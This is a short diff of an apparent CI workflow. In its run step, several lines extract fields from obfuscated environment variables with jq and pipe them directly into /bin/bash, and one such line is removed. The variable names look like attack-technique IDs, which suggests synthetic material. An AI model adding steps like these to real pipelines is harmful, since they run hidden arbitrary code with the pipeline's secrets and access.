@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$f50" | jq -r .nfok09 | /bin/bash
           echo $wypx577 | jq -r .ne6466 | /bin/bash
-          echo $t1055 | jq -r .zopc57 | /bin/bash
           printf '%s' "$r1562" | jq -r .kzhp394 | /bin/bash
           printf '%s' "$bpzd56417" | jq -r .dzykj94280 | /bin/bash
           printf '%s' "$cvryb995" | jq -r .ng99028 | /bin/bash
